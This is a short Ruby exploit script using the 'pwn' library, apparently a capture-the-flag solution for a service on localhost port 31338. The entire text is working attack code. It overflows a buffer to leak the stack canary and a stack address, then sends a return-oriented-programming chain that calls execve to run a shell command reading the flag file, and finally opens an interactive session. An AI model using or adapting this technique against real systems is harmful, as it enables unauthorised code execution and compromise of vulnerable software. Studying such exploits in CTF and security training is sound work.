require 'pwn'

context.arch = 'amd64'

r = Sock.new '127.0.0.1', 31338

r.send 'A'*0x19
canary = (u64(r.recvuntil("\n")[24,8])) & (~(0xff))
print "canary: %x\n" % canary

r.send 'A'*0x40
stack = u64(r.recvuntil("\n")[64,8].ljust(8, '\x00')) - 0x150
stack = stack & 0xffffffffffff
print "stack: %x\n" % stack

pop_rax_rdx_rbx = 0x47a6e6
pop_rsi = 0x4017f7
pop_rdi = 0x4005d5
syscall = 0x468e75

payload = 'A'*8 + '/bin/sh' + "\x00" + 'A'*8 + p64(canary) + p64(0) + p64(pop_rax_rdx_rbx) + p64(59) + p64(0) + p64(0) + p64(pop_rsi) + p64(stack+0x68) + p64(pop_rdi) + p64(stack) + p64(syscall) + p64(stack+0x88) + p64(stack+0x90) + p64(stack+0x98) + p64(0) + ("sh"+"\x00"*6) + ("-c"+"\x00"*6) + ("cat home/start/flag" +"\x00")

r.send payload
print "%s" % r.recvline

r.send "exit\n\x00"
print "%s" % r.recvline

r.interact
